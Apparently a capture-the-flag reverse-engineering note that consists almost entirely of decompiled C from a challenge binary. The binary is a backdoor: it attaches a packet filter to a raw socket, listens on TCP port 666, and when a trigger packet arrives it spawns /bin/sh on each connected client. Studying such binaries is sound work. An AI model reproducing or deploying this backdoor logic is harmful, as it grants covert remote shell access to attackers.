# baby-passed-filters (exe)
- service main function
- trigger data local_f0 = &DAT_001040e0;
```c




undefined4 main_FUN_00101289(void) {
  uint16_t uVar1;
  int iVar2;
  ssize_t sVar3;
  int *piVar4;
  long lVar5;
  undefined local_buffer [14];
  byte ip_header_ptr [12];
  byte abStack_2ee [486];
  byte local_108 [8];
  undefined *local_100;
  undefined2 local_f8 [4];
  undefined *local_f0;
  sockaddr local_e8;
  undefined4 local_cc;
  char *local_c8;
  undefined8 local_c0;
  byte *local_b8;
  epoll_event local_b0;
  int *local_a0;
  int *local_98;
  int local_8c;
  int *local_88;
  int *local_80;
  int local_78;
  int local_74;
  int local_70;
  uint local_6c;
  int *local_68;
  int *local_60;
  int local_58;
  __pid_t local_54;
  int *local_50;
  int *local_48;
  int local_40;
  int local_3c;
  undefined4 local_38;
  int local_34;
  int local_30;
  uint local_2c;
  int local_28;
  uint local_24;
  int local_20;
  int local_file_scriptor;
  int fd;
  int local_14;
  undefined4 local_10;
  int local_c;
  
  local_14 = 0xffffffff;
  local_c = -1;
  local_10 = 0xffffffff;
  fd = 0xffffffff;
  uVar1 = htons(3);
  fd = socket(0x11,3,(uint)uVar1);
  if (-1 < fd) {
    local_20 = -1;
    local_f8[0] = 1;
    local_f0 = &DAT_001040e0;
    local_108[0] = 0x76;
    local_108[1] = 1;
    local_100 = &DAT_00104100;
    local_file_scriptor = fd;
    iVar2 = setsockopt(fd,1,0x1a,local_f8,0x10);
    if (-1 < iVar2) {
      do {
        do {
          sVar3 = recv(local_file_scriptor,local_buffer,0x100,0x40);
        } while (sVar3 != -1);
        piVar4 = __errno_location();
      } while (*piVar4 != 0xb);
      iVar2 = setsockopt(local_file_scriptor,1,0x1a,local_108,0x10);
      if (-1 < iVar2) {
        local_20 = 0;
      }
    }
    if (((-1 < local_20) && (local_24 = fcntl(fd,3), -1 < (int)local_24)) &&
       (iVar2 = fcntl(fd,4,(ulong)(local_24 | 0x800)), -1 < iVar2)) goto LAB_00101418;
  }
  if (fd != -1) {
    close(fd);
    fd = -1;
  }
LAB_00101418:
  local_14 = fd;
  if (-1 < fd) {
    local_cc = 1;
    local_e8.sa_data[6] = '\0';
    local_e8.sa_data[7] = '\0';
    local_e8.sa_data[8] = '\0';
    local_e8.sa_data[9] = '\0';
    local_e8.sa_data[10] = '\0';
    local_e8.sa_data[0xb] = '\0';
    local_e8.sa_data[0xc] = '\0';
    local_e8.sa_data[0xd] = '\0';
    local_e8.sa_family = 2;
    local_e8.sa_data[0] = '\0';
    local_e8.sa_data[1] = '\0';
    local_e8.sa_data[2] = '\0';
    local_e8.sa_data[3] = '\0';
    local_e8.sa_data[4] = '\0';
    local_e8.sa_data[5] = '\0';
    uVar1 = htons(0x29a);
    local_e8.sa_data._0_2_ = uVar1;
    local_28 = socket(2,1,0);
    if ((((((local_28 < 0) || (iVar2 = setsockopt(local_28,1,2,&local_cc,4), iVar2 < 0)) ||
          ((iVar2 = setsockopt(local_28,1,0xf,&local_cc,4), iVar2 < 0 ||
           ((iVar2 = bind(local_28,&local_e8,0x10), iVar2 < 0 ||
            (iVar2 = listen(local_28,10), iVar2 < 0)))))) ||
         (local_2c = fcntl(local_28,3), (int)local_2c < 0)) ||
        (iVar2 = fcntl(local_28,4,(ulong)(local_2c | 0x800)), iVar2 < 0)) && (-1 < local_28)) {
      close(local_28);
      local_28 = -1;
    }
    local_c = local_28;
    if (-1 < local_28) {
      close(0);
      close(1);
      close(2);
      local_30 = local_14;
      local_34 = local_c;
      local_38 = 0xffffffff;
      local_c8 = "/bin/sh";
      local_c0 = 0;
      local_3c = epoll_create(1);
      if (-1 < local_3c) {
        local_b0._4_4_ = local_30;
        local_b0.events = 0x80000001;
        iVar2 = epoll_ctl(local_3c,1,local_30,&local_b0);
        if (-1 < iVar2) {
          local_b0._4_4_ = local_34;
          local_b0.events = 0x80000001;
          iVar2 = epoll_ctl(local_3c,1,local_34,&local_b0);
          if (-1 < iVar2) {
            while ((local_40 = epoll_wait(local_3c,&local_b0,1,-1), 0 < local_40 ||
                   (piVar4 = __errno_location(), *piVar4 == 4))) {
              if (0 < local_40) {
                if (local_30 == local_b0._4_4_) {
                  memset(local_buffer,0,0x200);
                  while( true ) {
                    sVar3 = recv(local_30,local_buffer,0x1ff,0);
                    local_70 = (int)sVar3;
                    if (local_70 < 1) break;
                    lVar5 = (long)(int)((uint)(ip_header_ptr[0] & 0xf) << 2);
                    local_b8 = ip_header_ptr + lVar5;
                    if ((abStack_2ee + lVar5 + 8 < local_108) &&
                       (local_b8 = local_b8 + (int)((uint)(abStack_2ee[lVar5] >> 4) << 2),
                       local_b8 < local_108)) {
                      local_48 = DAT_00104cb8;
                      while (local_48 != (int *)0x0) {
                        local_50 = *(int **)(local_48 + 2);
                        local_54 = fork();
                        if (local_54 == 0) {
                          local_54 = fork();
                          if (local_54 != 0) {
                    /* WARNING: Subroutine does not return */
                            exit(0);
                          }
                          close(local_34);
                          close(local_30);
                          for (local_50 = DAT_00104cb8; local_50 != (int *)0x0;
                              local_50 = *(int **)(local_50 + 2)) {
                            if (local_48 != local_50) {
                              close(*local_50);
                            }
                          }
                          do {
                            sVar3 = read(*local_48,local_buffer,0x200);
                          } while (0 < sVar3);
                          local_6c = fcntl(*local_48,3);
                          fcntl(*local_48,4,(ulong)(local_6c & 0xfffff7ff));
                          if (*local_48 != 0) {
                            dup2(*local_48,0);
                          }
                          if (*local_48 != 1) {
                            dup2(*local_48,1);
                          }
                          if (*local_48 != 2) {
                            dup2(*local_48,2);
                          }
                          if (2 < *local_48) {
                            close(*local_48);
                          }
                          execve(local_c8,&local_c8,(char **)0x0);
                        }
                        else {
                          epoll_ctl(local_3c,2,*local_48,(epoll_event *)0x0);
                          close(*local_48);
                          local_58 = *local_48;
                          local_60 = (int *)0x0;
                          if (DAT_00104cb8 != (int *)0x0) {
                            local_68 = DAT_00104cb8;
                            do {
                              if (local_58 == *local_68) break;
                              local_60 = local_68;
                              local_68 = *(int **)(local_68 + 2);
                            } while (local_68 != (int *)0x0);
                            if (local_68 != (int *)0x0) {
                              if (local_60 == (int *)0x0) {
                                DAT_00104cb8 = *(int **)(local_68 + 2);
                              }
                              else {
                                *(undefined8 *)(local_60 + 2) = *(undefined8 *)(local_68 + 2);
                              }
                              free(local_68);
                            }
                          }
                          waitpid(local_54,(int *)((long)&local_b0.data + 4),0);
                        }
                        local_48 = local_50;
                      }
                    }
                    memset(local_buffer,0,0x200);
                  }
                }
                else {
                  piVar4 = DAT_00104cb8;
                  if (local_34 == local_b0._4_4_) {
                    while (DAT_00104cb8 = piVar4,
                          local_74 = accept(local_34,(sockaddr *)0x0,(socklen_t *)0x0),
                          -1 < local_74) {
                      local_6c = fcntl(local_74,3);
                      if ((int)local_6c < 0) {
                        close(local_74);
                        piVar4 = DAT_00104cb8;
                      }
                      else {
                        iVar2 = fcntl(local_74,4,(ulong)(local_6c | 0x800));
                        if (iVar2 < 0) {
                          close(local_74);
                          piVar4 = DAT_00104cb8;
                        }
                        else {
                          local_b0._4_4_ = local_74;
                          local_b0.events = 0x80000001;
                          iVar2 = epoll_ctl(local_3c,1,local_74,&local_b0);
                          if (iVar2 < 0) {
                            close(local_74);
                            piVar4 = DAT_00104cb8;
                          }
                          else {
                            local_78 = local_74;
                            local_80 = (int *)malloc(0x10);
                            piVar4 = DAT_00104cb8;
                            if (local_80 != (int *)0x0) {
                              *local_80 = local_78;
                              local_80[2] = 0;
                              local_80[3] = 0;
                              piVar4 = local_80;
                              if (DAT_00104cb8 != (int *)0x0) {
                                for (local_88 = DAT_00104cb8; *(long *)(local_88 + 2) != 0;
                                    local_88 = *(int **)(local_88 + 2)) {
                                }
                                *(int **)(local_88 + 2) = local_80;
                                piVar4 = DAT_00104cb8;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                  else {
                    do {
                      sVar3 = read(local_b0._4_4_,local_buffer,0x200);
                      local_70 = (int)sVar3;
                    } while (0 < local_70);
                    if (local_70 < 1) {
                      epoll_ctl(local_3c,2,local_b0._4_4_,(epoll_event *)0x0);
                      close(local_b0._4_4_);
                      local_8c = local_b0._4_4_;
                      local_98 = (int *)0x0;
                      if (DAT_00104cb8 != (int *)0x0) {
                        local_a0 = DAT_00104cb8;
                        do {
                          if (local_b0._4_4_ == *local_a0) break;
                          local_98 = local_a0;
                          local_a0 = *(int **)(local_a0 + 2);
                        } while (local_a0 != (int *)0x0);
                        if (local_a0 != (int *)0x0) {
                          if (local_98 == (int *)0x0) {
                            DAT_00104cb8 = *(int **)(local_a0 + 2);
                          }
                          else {
                            *(undefined8 *)(local_98 + 2) = *(undefined8 *)(local_a0 + 2);
                          }
                          free(local_a0);
                        }
                      }
                    }
                  }
                }
              }
            }
            local_38 = 0;
          }
        }
      }
      local_10 = 0;
    }
  }
  if (local_14 != -1) {
    close(local_14);
  }
  if (local_c != -1) {
    close(local_c);
  }
  return local_10;
}

```